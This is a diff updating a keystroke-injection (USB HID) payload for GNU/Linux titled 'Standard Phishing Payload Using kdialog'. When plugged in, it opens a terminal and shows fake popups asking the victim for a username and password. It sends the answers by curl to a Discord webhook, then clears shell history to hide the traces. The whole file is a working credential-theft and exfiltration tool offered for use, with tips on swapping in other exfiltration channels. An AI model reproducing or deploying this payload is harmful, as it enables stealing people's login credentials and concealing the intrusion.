@@ -1,46 +1,49 @@
-*  ##########################################################
-*  #                                                        |
-*  # Title        : Standard Phishing Payload Using kdialog |
-*  # Author       : Aleff                                   |
-*  # Version      : 1.0                                     |
-*  # Category     : Phishing                                |
-*  # Target       : Linux                                   |
-*  #                                                        |
-*  ##########################################################
+##########################################################
+#                                                        #
+# Title        : Standard Phishing Payload Using kdialog #
+# Author       : Aleff                                   #
+# Version      : 1.0                                     #
+# Category     : Phishing                                #
+# Target       : GNU/Linux                               #
+#                                                        #
+##########################################################
 
-*  Requirements:
-*      - EXFILTRATION:
-*          - Internet Connection
-*          - Discord webhook for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Dropbox, Telegram and so on..)
-*      - PHISHING:
-*          - This payload is usable on the Linux system where is installed 'kdialog', but you can use whatever you want for simulate the popup with the intent to take the input
-*          - It is important that the popup payload occurs in a single line so that the traces of data collection are eliminated immediately after submission. This is precisely why you can see the * ed code to get a good understanding of what it is all about.
+ATTACKMODE HID
 
+# REQUIREMENTS
+#  - EXFILTRATION:
+#   - Internet Connection
+#   - Discord webhook for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Dropbox, Telegram and so on..)
+#  - PHISHING:
+#   - This payload is usable on the GNU/Linux system where is installed 'kdialog', but you can use whatever you want for simulate the popup with the intent to take the input
+#   - It is important that the popup payload occurs in a single line so that the traces of data collection are eliminated immediately after submission. This is precisely why you can see the * ed code to get a good understanding of what it is all about.
 
-QUACK DELAY 1000
+# VARIABLES
+# 1) Provide Discord Webhook
+DISCORD_WEBHOOK='https://discordapp.com/api/webhooks/<webhook_id>/<token>'
+# You can set the title, the message, the input type and so and so on...
+POPUP_TITLE0='Config Popup'
+POPUP-MESSAGE0='Insert your username and password for go on'
+POPUP-TITLE1='Insert your Username'
+POPUP-MESSAGE1='Username'
+POPUP-TITLE2='Insert your Password'
+POPUP-MESSAGE2='Password'
+
+QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 2000
 
-*  REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-QUACK STRING WEBHOOK_URL="WEBHOOK"
-QUACK ENTER
-QUACK DELAY 500
+# A short and efficient cURL command to send an HTTP POST request to a webhook URL with JSON data in the request body.
+QUACK STRING $(curl -H 'Content-Type: application/json' -X POST -d '{\"content\": \"$(
 
+# A compact command that uses kdialog to display a popup message prompting (into the curl content section) the user to enter their username and password to proceed. You can't acquire multiple input in one popup, so you should use multiple popup, as i wrote here.
+QUACK STRING kdialog --title $POPUP_TITLE0 --msgbox $POPUP-MESSAGE0; 
+QUACK STRING kdialog --title $POPUP-TITLE1 --inputbox $POPUP-MESSAGE1; 
+QUACK STRING kdialog --title $POPUP-TITLE2 --password $POPUP-MESSAGE2 --default 'password';
 
-*  A short and efficient cURL command to send an HTTP POST request to a webhook URL with JSON data in the request body.
-QUACK STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(
+# The end part of the curl payload...
+QUACK STRING )\"}' $DISCORD_WEBHOOK); 
 
-*  A compact command that uses kdialog to display a popup message prompting (into the curl content section) the user to enter their username and password to proceed. You can't acquire multiple input in one popup, so you should use multiple popup, as i wrote here.
-*  You can set the title, the message, the input type and so and so on...
-QUACK STRING kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; 
-QUACK STRING kdialog --title "Insert your Username" --inputbox "Username"; 
-QUACK STRING kdialog --title "Insert your Password" --password "Password" --default "password";
-
-*  The end part of the curl payload...
-QUACK STRING )\"}" $WEBHOOK_URL); 
-
-*  history -c will clear the last shell history and the exit command will close the popup at the end of the execution
+# history -c will clear the last shell history and the exit command will close the popup at the end of the execution
 QUACK STRING history -c; exit;
-
-*  All-In-One doesn't need delay time
 QUACK ENTER
